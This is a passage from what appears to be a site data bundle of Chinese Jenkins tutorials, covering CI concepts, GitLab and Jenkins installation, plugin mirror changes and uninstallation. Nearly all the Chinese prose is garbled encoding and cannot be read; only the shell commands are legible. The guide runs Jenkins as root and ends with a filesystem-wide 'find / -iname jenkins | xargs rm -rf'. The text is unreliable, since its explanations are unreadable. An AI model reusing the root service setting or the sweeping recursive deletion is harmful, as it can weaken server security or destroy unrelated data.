ï¼å­æ¡£ï¼åå°çäº§æå¡å¨ã\n * åæ»\n   ä¸æ¦å½åçæ¬åçé®é¢ï¼å°±è¦åæ»å°ä¸ä¸ä¸ªçæ¬çæå»ºç»æãæç®åçåæ³å°±æ¯ä¿®æ¹ä¸ä¸ç¬¦å·é¾æ¥ï¼æåä¸ä¸ä¸ªçæ¬çç®å½ã\n\n\n# æç»­éæçç»æè¦ç´ \n\n * ä¸ä¸ªèªå¨æå»ºè¿ç¨ï¼ ä»æ£åºä»£ç ã ç¼è¯æå»ºã è¿è¡æµè¯ã ç»æè®°å½ã æµè¯ç»è®¡ç­é½æ¯èªå¨å®æçï¼ æ éäººå·¥å¹²é¢ã\n * ä¸ä¸ªä»£ç å­å¨åºï¼å³éè¦çæ¬æ§å¶è½¯ä»¶æ¥ä¿éä»£ç çå¯ç»´æ¤æ§ï¼åæ¶ä½ä¸ºæå»ºè¿ç¨çç´ æåºï¼ä¸è¬ä½¿ç¨ svn æ gitã\n * ä¸ä¸ªæç»­éææå¡å¨ï¼ jenkins å°±æ¯ä¸ä¸ªéç½®ç®ååä½¿ç¨æ¹ä¾¿çæç»­éææå¡å¨ã\n\n\n\n\n# æç»­éæçå¥½å¤\n\n1ãéä½é£é©ï¼ç±äºæç»­éæä¸æ­å»æå»ºï¼ç¼è¯åæµè¯ï¼å¯ä»¥å¾æ©æåç°é®é¢ï¼æä»¥ä¿®å¤çä»£ä»·å°±å°ï¼\n2ãå¯¹ç³»ç»å¥åº·æç»­æ£æ¥ï¼åå°åå¸é£é©å¸¦æ¥çé®é¢ï¼\n3ãåå°éå¤æ§å·¥ä½ï¼\n4ãæç»­é¨ç½²ï¼æä¾å¯é¨ç½²åååï¼\n5ãæç»­äº¤ä»å¯ä¾ä½¿ç¨ççæ¬ï¼\n6ãå¢å¼ºå¢éä¿¡å¿ï¼\n\n\n# jenkins ä»ç»\n\njenkins æ¯ä¸æ¬¾æµè¡çå¼æºæç»­éæï¼continuous integrationï¼å·¥å·ï¼å¹¿æ³ç¨äºé¡¹ç®å¼åï¼å·æèªå¨åæå»ºãæµè¯åé¨ç½²ç­åè½ãå®ç½ï¼ http://jenkins-ci.org/ã\n\njenkins çç¹å¾ï¼\n\n * å¼æºç java è¯­è¨å¼åæç»­éæå·¥å·ï¼æ¯ææç»­éæï¼æç»­é¨ç½²ã\n * æäºå®è£é¨ç½²éç½®ï¼å¯éè¿ yum å®è£ï¼æä¸è½½ war åä»¥åéè¿ docker å®¹å¨ç­å¿«éå®ç°å®è£é¨ç½²ï¼å¯æ¹ä¾¿ web çé¢éç½®ç®¡çã\n * æ¶æ¯éç¥åæµè¯æ¥åï¼éæ rss/e-mail éè¿ rss åå¸æå»ºç»ææå½æå»ºå®ææ¶éè¿ e-mail éç¥ï¼çæ junit/testng æµè¯æ¥åã\n * åå¸å¼æå»ºï¼æ¯æ jenkins è½å¤è®©å¤å°è®¡ç®æºä¸èµ·æå»º / æµè¯ã\n * æä»¶è¯å«ï¼jenkins è½å¤è·è¸ªåªæ¬¡æå»ºçæåªäº jarï¼åªæ¬¡æå»ºä½¿ç¨åªä¸ªçæ¬ç jar ç­ã\n * ä¸°å¯çæä»¶æ¯æï¼æ¯ææ©å±æä»¶ï¼ä½ å¯ä»¥å¼åéåèªå·±å¢éä½¿ç¨çå·¥å·ï¼å¦ gitï¼svnï¼mavenï¼docker ç­ã",charsets:{cjk:!0}},{title:"Jenkins(äº) Jenkinså®è£åç¯å¢éç½®",frontmatter:{title:"Jenkins(äº) Jenkinså®è£åç¯å¢éç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/501",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/501.Jenkins(%E4%BA%8C)%20Jenkins%E5%AE%89%E8%A3%85%E5%92%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.html",relativePath:"04.è¿ç»´/50.Jenkins/501.Jenkins(äº) Jenkinså®è£åç¯å¢éç½®.md",key:"v-64e25eba",path:"/jenkins/501/",headers:[{level:2,title:"æç»­éææµç¨è¯´æ",slug:"æç»­éææµç¨è¯´æ",normalizedTitle:"æç»­éææµç¨è¯´æ",charIndex:2},{level:2,title:"Gitlabä»£ç æç®¡æå¡å¨å®è£",slug:"gitlabä»£ç æç®¡æå¡å¨å®è£",normalizedTitle:"gitlab ä»£ç æç®¡æå¡å¨å®è£",charIndex:433},{level:3,title:"Gitlabç®ä»",slug:"gitlabç®ä»",normalizedTitle:"gitlab ç®ä»",charIndex:454},{level:3,title:"Gitlabå®è£",slug:"gitlabå®è£",normalizedTitle:"gitlab å®è£",charIndex:763},{level:2,title:"Gitlabæ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®",slug:"gitlabæ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®",normalizedTitle:"gitlab æ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®",charIndex:1771},{level:2,title:"Jenkinså®è£",slug:"jenkinså®è£",normalizedTitle:"jenkins å®è£",charIndex:2310},{level:2,title:"jenkinsæä»¶ç®¡ç",slug:"jenkinsæä»¶ç®¡ç",normalizedTitle:"jenkins æä»¶ç®¡ç",charIndex:4225},{level:3,title:"ä¿®æ¹Jenkinsæä»¶ä¸è½½å°å",slug:"ä¿®æ¹jenkinsæä»¶ä¸è½½å°å",normalizedTitle:"ä¿®æ¹ jenkins æä»¶ä¸è½½å°å",charIndex:4334},{level:2,title:"Jenkins å¸è½½",slug:"jenkins-å¸è½½",normalizedTitle:"jenkins å¸è½½",charIndex:5079}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æç»­éææµç¨è¯´æ Gitlabä»£ç æç®¡æå¡å¨å®è£ Gitlabç®ä» Gitlabå®è£ Gitlabæ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç® Jenkinså®è£ jenkinsæä»¶ç®¡ç ä¿®æ¹Jenkinsæä»¶ä¸è½½å°å Jenkins å¸è½½",content:'# æç»­éææµç¨è¯´æ\n\n\n\n1. é¦åï¼å¼åäººåæ¯å¤©è¿è¡ä»£ç æäº¤ï¼æäº¤å° Git ä»åº\n2. ç¶åï¼Jenkins ä½ä¸ºæç»­éæå·¥å·ï¼ä½¿ç¨ Git å·¥å·å° Git ä»åºæåä»£ç å°éææå¡å¨ï¼åéå JDKï¼Maven ç­è½¯ä»¶å®æä»£ç ç¼è¯ï¼ä»£ç æµè¯ä¸å®¡æ¥ï¼æµè¯ï¼æåç­å·¥ä½ï¼å¨è¿ä¸ªè¿ç¨ä¸­æ¯ä¸æ­¥åºéï¼é½éæ°åæ§è¡ä¸æ¬¡æ´ä¸ªæµç¨ã\n3. æåï¼Jenkins æçæç jar æ war åååå°æµè¯æå¡å¨æèçäº§æå¡å¨ï¼æµè¯äººåæç¨æ·å°±å¯ä»¥è®¿é®åºç¨ã\n\næå¡å¨åè¡¨\n\nåç§°         IP å°å            å®è£çè½¯ä»¶\nä»£ç æç®¡æå¡å¨    192.168.66.100   Gitlab-12.4.2\næç»­éææå¡å¨    192.168.66.101   Jenkins-2.190.3ï¼JDK1.8ï¼Maven3.6.2ï¼Gitï¼SonarQube\næµè¯æçäº§æå¡å¨   192.168.66.102   JDK1.8ï¼Tomcat8.5\n\n\n# Gitlab ä»£ç æç®¡æå¡å¨å®è£\n\n\n# Gitlab ç®ä»\n\nå®ç½ï¼ https://about.gitlab.com/\n\nGitLab æ¯ä¸ä¸ªç¨äºä»åºç®¡çç³»ç»çå¼æºé¡¹ç®ï¼ä½¿ç¨ Git ä½ä¸ºä»£ç ç®¡çå·¥å·ï¼å¹¶å¨æ­¤åºç¡ä¸æ­å»ºèµ·æ¥ç web æå¡ã\n\nGitLab å GitHub ä¸æ ·å±äºç¬¬ä¸æ¹åºäº Git å¼åçä½åï¼åè´¹ä¸å¼æºï¼åºäº MIT åè®®ï¼ï¼ä¸ Github ç±»ä¼¼ï¼å¯ä»¥æ³¨åç¨æ·ï¼ä»»ææäº¤ä½ çä»£ç ï¼æ·»å  SSHKey ç­ç­ãä¸åçæ¯ï¼GitLab æ¯å¯ä»¥é¨ç½²å°èªå·±çæå¡å¨ä¸ï¼æ°æ®åºç­ä¸åä¿¡æ¯é½ææ¡å¨èªå·±æä¸ï¼éåå¢éåé¨åä½å¼åï¼ä½ æ»ä¸å¯è½æå¢éåé¨çæºæ§æ»æ¾å¨å«äººçæå¡å¨ä¸å§ï¼ç®åæ¥è¯´å¯æ GitLab çä½ä¸ªäººçç GitHubã\n\n\n# Gitlab å®è£\n\n1. å®è£ç¸å³ä¾èµ\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. å¯å¨ ssh æå¡ & è®¾ç½®ä¸ºå¼æºå¯å¨\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. è®¾ç½® postfix å¼æºèªå¯ï¼å¹¶å¯å¨ï¼postfix æ¯æ gitlab åä¿¡åè½\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. å¼æ¾ ssh ä»¥å http æå¡ï¼ç¶åéæ°å è½½é²ç«å¢åè¡¨\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> å¦æå³é­é²ç«å¢å°±ä¸éè¦åä»¥ä¸éç½®\n\n5. ä¸è½½ gitlab åï¼å¹¶ä¸å®è£\nå¨çº¿ä¸è½½å®è£åï¼\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# å®è£\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. ä¿®æ¹ gitlab éç½®\n\nvi /etc/gitlab/gitlab.rb\n# ä¿®æ¹gitlabè®¿é®å°ååç«¯å£ï¼é»è®¤ä¸º80ï¼æä»¬æ¹ä¸º82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. éè½½éç½®åå¯å¨ gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. æç«¯å£æ·»å å°é²ç«å¢\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\nå¯å¨æååï¼çå°ä»¥ä¸ä¿®æ¹ç®¡çå root å¯ç çé¡µé¢ï¼ä¿®æ¹å¯ç åï¼ç¶åç»å½å³å¯\n\n\n# Gitlab æ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®\n\n1. åå»ºç»\nä½¿ç¨ç®¡çå root åå»ºç»ï¼ä¸ä¸ªç»éé¢å¯ä»¥æå¤ä¸ªé¡¹ç®åæ¯ï¼å¯ä»¥å°å¼åæ·»å å°ç»éé¢è¿è¡è®¾ç½®æéï¼ä¸åçç»å°±æ¯å¬å¸ä¸åçå¼åé¡¹ç®æèæå¡æ¨¡åï¼ä¸åçç»æ·»å ä¸åçå¼åå³å¯å®ç°å¯¹å¼åè®¾ç½®æéçç®¡ç\n\n2. åå»ºç¨æ·\nåå»ºç¨æ·çæ¶åï¼å¯ä»¥éæ© Regular æ Admin ç±»åãåå»ºå®ç¨æ·åï¼ç«å³ä¿®æ¹å¯ç \n\n3. å°ç¨æ·æ·»å å°ç»ä¸­\néæ©æä¸ªç¨æ·ç»ï¼è¿è¡ Members ç®¡çç»çæå\n\nGitlab ç¨æ·å¨ç»éé¢æ 5 ç§ä¸åæéï¼\n\n * Guestï¼å¯ä»¥åå»º issueãåè¡¨è¯è®ºï¼ä¸è½è¯»åçæ¬åº Reporterï¼å¯ä»¥åéä»£ç ï¼ä¸è½æäº¤ï¼QAãPM å¯ä»¥èµäºè¿ä¸ªæé\n * Developerï¼å¯ä»¥åéä»£ç ãå¼åãæäº¤ãpushï¼æ®éå¼åå¯ä»¥èµäºè¿ä¸ªæé\n * Maintainerï¼å¯ä»¥åå»ºé¡¹ç®ãæ·»å  tagãä¿æ¤åæ¯ãæ·»å é¡¹ç®æåãç¼è¾é¡¹ç®ï¼æ ¸å¿å¼åå¯ä»¥èµäºè¿ä¸ªæé\n * Ownerï¼å¯ä»¥è®¾ç½®é¡¹ç®è®¿é®æé - Visibility Levelãå é¤é¡¹ç®ãè¿ç§»é¡¹ç®ãç®¡çç»æåï¼å¼åç»ç»é¿å¯ä»¥èµäºè¿ä¸ªæé\n\n4. å¨ç¨æ·ç»ä¸­åå»ºé¡¹ç®\nä»¥åæåå»ºçæ°ç¨æ·èº«ä»½ç»å½å° Gitlabï¼ç¶åå¨ç¨æ·ç»ä¸­åå»ºæ°çé¡¹ç®\n\n\n# Jenkins å®è£\n\n1. è·å jenkins å®è£åï¼ä¸è½½é¡µé¢ï¼http://mirrors.jenkins-ci.org/redhat/\n\n# å½åç¯å¢ä¸æ¯é£ä¹å¥½ï¼ä¸è½½è¦ç§å­¦\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# å®è£\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. ä¿®æ¹ Jenkins éç½®\n\nvim /etc/sysconfig/jenkins\n# ä¿®æ¹åå®¹å¦ä¸\n# è½æ§è¡jenkinsçç¨æ·æé\nJENKINS_USER="root" \n# é¡µé¢è®¿é®ç«¯å£\nJENKINS_PORT="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. å¯å¨ Jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> æ¥é\n> Starting Jenkins bash: /usr/bin/java: æ²¡æé£ä¸ªæä»¶æç®å½\n> Failed to start LSB: Jenkins Automation Server.\n> æ¯å ä¸º jenkins åé¨èªå·±éç½®äº java å°åï¼éè¦æ¹ä¸ä¸ã\n> vim /etc/init.d/jenkins\n> /usr/bin/java æ¾å°ï¼å¹¶æ¹æèªå·±ç java å°åï¼æçæ¯ /opt/software/java8/jre/bin/javaï¼æ³¨æè¿éæ¾çæ¯ jre çã\n> æ§è¡ systemctl daemon-reloadï¼å¨æ§è¡ systemctl start jenkins\n\n> ææ°çæ¬ Jenkins 2.346.1 åä¹åçæ¬è¿æ¯æä¸ä¸æ ·çå°æ¹ï¼è¿éåªè¯´å ä¸ª Jenkins 2.346.1 éå°çæ¥éï¼\n> 1 Aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid Java installation è¿ç§æ¥éä¸ç´è¯´æ¯æ²¡å®è£ JAVAï¼ä½æ¯ææææç§ä»¥ä¸æ¹å¼é½éç½®è¿äºï¼æç»è§£å³æ¹å¼å°±æ¯ç¼è¾ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼æ¾å°è¢«æ³¨éç Environment="JAVA_HOME="ï¼æèªå·±ç JAVA è·¯å¾åä¸ï¼å¦ /opt/software/jdk\n> 2 Aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.BindException: Address already in use ä½ ä¼åç°å¨ vim /etc/sysconfig/jenkins æä»¶é½æ¹è¿äºï¼ä½è¿æ¯ç«¯å£å ç¨ï¼ä¾ç¶éè¦ä¿®æ¹ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼å¹¶ç¼è¾ Environment="JENKINS_PORT=7777" æ¹æèªå·±éè¦çç«¯å£\n> 3 Aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: Caused: java.io.IOException: Failed to start Jetty æ£æ¥ææéç½®åæ¬ /etc/sysconfig/jenkins å /usr/lib/systemd/system/jenkins.serviceï¼å´æ¥éç½®æ­£ç¡®\n> 4 Aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid Java version: java version "17.0.3.1" 2022-04-22 LTS JAVA çæ¬è¿é«æè¿ä½å¯¼è´ï¼æç¨ java17 æ 11 ç´æ¥ä¸è¡ï¼æ¢æ 8 å°±å¥½äº\n\n4. æå¼æµè§å¨è®¿é®\nhttp://192.168.66.101:7777\n\n> æ³¨æï¼æ¬æå¡å¨æé²ç«å¢å³é­äºï¼å¦æå¼å¯é²ç«å¢ï¼éè¦å¨é²ç«å¢æ·»å ç«¯å£\n\n5. è·åå¹¶è¾å¥ admin è´¦æ·å¯ç \n\ncat /var/lib/jenkins/secrets/initialAdminPassword\n\n\n1\n\n\n6. æ·»å ä¸ä¸ªç®¡çåè´¦æ·ï¼å¹¶è¿å¥ Jenkins åå°\n\n7. è·³è¿æä»¶å®è£\nå ä¸º Jenkins æä»¶éè¦è¿æ¥é»è®¤å®ç½ä¸è½½ï¼éåº¦éå¸¸æ¢ï¼èä¸ç»è¿ä¼å¤±è´¥ï¼æä»¥æä»¬ææ¶åè·³è¿æä»¶å®è£\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins æä»¶ç®¡ç\n\nJenkins æ¬èº«ä¸æä¾å¾å¤åè½ï¼æä»¬å¯ä»¥éè¿ä½¿ç¨æä»¶æ¥æ»¡è¶³æä»¬çä½¿ç¨ãä¾å¦ä» Gitlab æåä»£ç ï¼ä½¿ç¨ Maven æå»ºé¡¹ç®ç­åè½éè¦ä¾é æä»¶å®æãæ¥ä¸æ¥æ¼ç¤ºå¦ä½ä¸è½½æä»¶ã\n\n\n# ä¿®æ¹ Jenkins æä»¶ä¸è½½å°å\n\nJenkins å½å¤å®æ¹æä»¶å°åä¸è½½éåº¦éå¸¸æ¢ï¼æä»¥å¯ä»¥ä¿®æ¹ä¸ºå½åæä»¶å°åï¼Jenkins->Manage Jenkins->Manage Pluginsï¼ç¹å» Available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\næ­¤æ¶æä»¬å¯ä»¥è¿å¥ /var/lib/jenkins/updatesï¼çå°æä¸ª default.jsonï¼è¿ä¸ªæä»¶éé¢æ¯æææä»¶çå°åï¼è¿éé¢çå°åç®åå¨æ¯å½å¤çå°åï¼å¯ä»¥ç¨ä»¥ä¸å½ä»¤è¿è¡æ¿æ¢å°å½åå°åã\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\næåï¼Manage Plugins ç¹å» Advancedï¼æ Update Site æ¹ä¸ºå½åæä»¶ä¸è½½å°å\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\néå¯ jenkins ï¼å¨è®¿é®è·¯å¾åé¢é®å¥ restart å³å¯ã\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\néå¯å¥½åï¼æä»¬è¿è¡å¯¹ jenkins è¿è¡æ±åã\n\n\n\n\n\n> jenkins çæ¬æ´æ°å¤ªå¿«ï¼åæ¬æ ¸å¿åºä¹ä¼æ´æ°ï¼å¤§å®¶å¯ä»¥æ¾å¿æ´æ°ï¼ä¸ç¨æï¼æå¤å°±æ¯èµ·ä¸æ¥éè£ã\n\n\n# Jenkins å¸è½½\n\nååæ­¢ Jenkins çè¿è¡\n\n# æ¹å¼ä¸\nsystemctl stop jenkins\n# æ¹å¼äº\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\næ¾å°ææè· Jenkins ç¸å³çå\n\nrpm -qc jenkins\n\n\n1\n\n\nå¸è½½ç¸å³å\n\nrpm -e jenkins\n\n\n1\n\n\næ£æ¥æ¯å¦å¸è½½æå\n\nrpm -ql jenkins\n\n\n1\n\n\nå é¤åä¸æä»¶\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',normalizedContent:'# æç»­éææµç¨è¯´æ\n\n\n\n1. é¦åï¼å¼åäººåæ¯å¤©è¿è¡ä»£ç æäº¤ï¼æäº¤å° git ä»åº\n2. ç¶åï¼jenkins ä½ä¸ºæç»­éæå·¥å·ï¼ä½¿ç¨ git å·¥å·å° git ä»åºæåä»£ç å°éææå¡å¨ï¼åéå jdkï¼maven ç­è½¯ä»¶å®æä»£ç ç¼è¯ï¼ä»£ç æµè¯ä¸å®¡æ¥ï¼æµè¯ï¼æåç­å·¥ä½ï¼å¨è¿ä¸ªè¿ç¨ä¸­æ¯ä¸æ­¥åºéï¼é½éæ°åæ§è¡ä¸æ¬¡æ´ä¸ªæµç¨ã\n3. æåï¼jenkins æçæç jar æ war åååå°æµè¯æå¡å¨æèçäº§æå¡å¨ï¼æµè¯äººåæç¨æ·å°±å¯ä»¥è®¿é®åºç¨ã\n\næå¡å¨åè¡¨\n\nåç§°         ip å°å            å®è£çè½¯ä»¶\nä»£ç æç®¡æå¡å¨    192.168.66.100   gitlab-12.4.2\næç»­éææå¡å¨    192.168.66.101   jenkins-2.190.3ï¼jdk1.8ï¼maven3.6.2ï¼gitï¼sonarqube\næµè¯æçäº§æå¡å¨   192.168.66.102   jdk1.8ï¼tomcat8.5\n\n\n# gitlab ä»£ç æç®¡æå¡å¨å®è£\n\n\n# gitlab ç®ä»\n\nå®ç½ï¼ https://about.gitlab.com/\n\ngitlab æ¯ä¸ä¸ªç¨äºä»åºç®¡çç³»ç»çå¼æºé¡¹ç®ï¼ä½¿ç¨ git ä½ä¸ºä»£ç ç®¡çå·¥å·ï¼å¹¶å¨æ­¤åºç¡ä¸æ­å»ºèµ·æ¥ç web æå¡ã\n\ngitlab å github ä¸æ ·å±äºç¬¬ä¸æ¹åºäº git å¼åçä½åï¼åè´¹ä¸å¼æºï¼åºäº mit åè®®ï¼ï¼ä¸ github ç±»ä¼¼ï¼å¯ä»¥æ³¨åç¨æ·ï¼ä»»ææäº¤ä½ çä»£ç ï¼æ·»å  sshkey ç­ç­ãä¸åçæ¯ï¼gitlab æ¯å¯ä»¥é¨ç½²å°èªå·±çæå¡å¨ä¸ï¼æ°æ®åºç­ä¸åä¿¡æ¯é½ææ¡å¨èªå·±æä¸ï¼éåå¢éåé¨åä½å¼åï¼ä½ æ»ä¸å¯è½æå¢éåé¨çæºæ§æ»æ¾å¨å«äººçæå¡å¨ä¸å§ï¼ç®åæ¥è¯´å¯æ gitlab çä½ä¸ªäººçç githubã\n\n\n# gitlab å®è£\n\n1. å®è£ç¸å³ä¾èµ\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. å¯å¨ ssh æå¡ & è®¾ç½®ä¸ºå¼æºå¯å¨\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. è®¾ç½® postfix å¼æºèªå¯ï¼å¹¶å¯å¨ï¼postfix æ¯æ gitlab åä¿¡åè½\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. å¼æ¾ ssh ä»¥å http æå¡ï¼ç¶åéæ°å è½½é²ç«å¢åè¡¨\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> å¦æå³é­é²ç«å¢å°±ä¸éè¦åä»¥ä¸éç½®\n\n5. ä¸è½½ gitlab åï¼å¹¶ä¸å®è£\nå¨çº¿ä¸è½½å®è£åï¼\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# å®è£\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. ä¿®æ¹ gitlab éç½®\n\nvi /etc/gitlab/gitlab.rb\n# ä¿®æ¹gitlabè®¿é®å°ååç«¯å£ï¼é»è®¤ä¸º80ï¼æä»¬æ¹ä¸º82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. éè½½éç½®åå¯å¨ gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. æç«¯å£æ·»å å°é²ç«å¢\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\nå¯å¨æååï¼çå°ä»¥ä¸ä¿®æ¹ç®¡çå root å¯ç çé¡µé¢ï¼ä¿®æ¹å¯ç åï¼ç¶åç»å½å³å¯\n\n\n# gitlab æ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®\n\n1. åå»ºç»\nä½¿ç¨ç®¡çå root åå»ºç»ï¼ä¸ä¸ªç»éé¢å¯ä»¥æå¤ä¸ªé¡¹ç®åæ¯ï¼å¯ä»¥å°å¼åæ·»å å°ç»éé¢è¿è¡è®¾ç½®æéï¼ä¸åçç»å°±æ¯å¬å¸ä¸åçå¼åé¡¹ç®æèæå¡æ¨¡åï¼ä¸åçç»æ·»å ä¸åçå¼åå³å¯å®ç°å¯¹å¼åè®¾ç½®æéçç®¡ç\n\n2. åå»ºç¨æ·\nåå»ºç¨æ·çæ¶åï¼å¯ä»¥éæ© regular æ admin ç±»åãåå»ºå®ç¨æ·åï¼ç«å³ä¿®æ¹å¯ç \n\n3. å°ç¨æ·æ·»å å°ç»ä¸­\néæ©æä¸ªç¨æ·ç»ï¼è¿è¡ members ç®¡çç»çæå\n\ngitlab ç¨æ·å¨ç»éé¢æ 5 ç§ä¸åæéï¼\n\n * guestï¼å¯ä»¥åå»º issueãåè¡¨è¯è®ºï¼ä¸è½è¯»åçæ¬åº reporterï¼å¯ä»¥åéä»£ç ï¼ä¸è½æäº¤ï¼qaãpm å¯ä»¥èµäºè¿ä¸ªæé\n * developerï¼å¯ä»¥åéä»£ç ãå¼åãæäº¤ãpushï¼æ®éå¼åå¯ä»¥èµäºè¿ä¸ªæé\n * maintainerï¼å¯ä»¥åå»ºé¡¹ç®ãæ·»å  tagãä¿æ¤åæ¯ãæ·»å é¡¹ç®æåãç¼è¾é¡¹ç®ï¼æ ¸å¿å¼åå¯ä»¥èµäºè¿ä¸ªæé\n * ownerï¼å¯ä»¥è®¾ç½®é¡¹ç®è®¿é®æé - visibility levelãå é¤é¡¹ç®ãè¿ç§»é¡¹ç®ãç®¡çç»æåï¼å¼åç»ç»é¿å¯ä»¥èµäºè¿ä¸ªæé\n\n4. å¨ç¨æ·ç»ä¸­åå»ºé¡¹ç®\nä»¥åæåå»ºçæ°ç¨æ·èº«ä»½ç»å½å° gitlabï¼ç¶åå¨ç¨æ·ç»ä¸­åå»ºæ°çé¡¹ç®\n\n\n# jenkins å®è£\n\n1. è·å jenkins å®è£åï¼ä¸è½½é¡µé¢ï¼http://mirrors.jenkins-ci.org/redhat/\n\n# å½åç¯å¢ä¸æ¯é£ä¹å¥½ï¼ä¸è½½è¦ç§å­¦\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# å®è£\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. ä¿®æ¹ jenkins éç½®\n\nvim /etc/sysconfig/jenkins\n# ä¿®æ¹åå®¹å¦ä¸\n# è½æ§è¡jenkinsçç¨æ·æé\njenkins_user="root" \n# é¡µé¢è®¿é®ç«¯å£\njenkins_port="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. å¯å¨ jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> æ¥é\n> starting jenkins bash: /usr/bin/java: æ²¡æé£ä¸ªæä»¶æç®å½\n> failed to start lsb: jenkins automation server.\n> æ¯å ä¸º jenkins åé¨èªå·±éç½®äº java å°åï¼éè¦æ¹ä¸ä¸ã\n> vim /etc/init.d/jenkins\n> /usr/bin/java æ¾å°ï¼å¹¶æ¹æèªå·±ç java å°åï¼æçæ¯ /opt/software/java8/jre/bin/javaï¼æ³¨æè¿éæ¾çæ¯ jre çã\n> æ§è¡ systemctl daemon-reloadï¼å¨æ§è¡ systemctl start jenkins\n\n> ææ°çæ¬ jenkins 2.346.1 åä¹åçæ¬è¿æ¯æä¸ä¸æ ·çå°æ¹ï¼è¿éåªè¯´å ä¸ª jenkins 2.346.1 éå°çæ¥éï¼\n> 1 aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid java installation è¿ç§æ¥éä¸ç´è¯´æ¯æ²¡å®è£ javaï¼ä½æ¯ææææç§ä»¥ä¸æ¹å¼é½éç½®è¿äºï¼æç»è§£å³æ¹å¼å°±æ¯ç¼è¾ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼æ¾å°è¢«æ³¨éç environment="java_home="ï¼æèªå·±ç java è·¯å¾åä¸ï¼å¦ /opt/software/jdk\n> 2 aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.bindexception: address already in use ä½ ä¼åç°å¨ vim /etc/sysconfig/jenkins æä»¶é½æ¹è¿äºï¼ä½è¿æ¯ç«¯å£å ç¨ï¼ä¾ç¶éè¦ä¿®æ¹ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼å¹¶ç¼è¾ environment="jenkins_port=7777" æ¹æèªå·±éè¦çç«¯å£\n> 3 aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: caused: java.io.ioexception: failed to start jetty æ£æ¥ææéç½®åæ¬ /etc/sysconfig/jenkins å /usr/lib/systemd/system/jenkins.serviceï¼å´æ¥éç½®æ­£ç¡®\n> 4 aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid java version: java version "17.0.3.1" 2022-04-22 lts java çæ¬è¿é«æè¿ä½å¯¼è´ï¼æç¨ java17 æ 11 ç´æ¥ä¸è¡ï¼æ¢æ 8 å°±å¥½äº\n\n4. 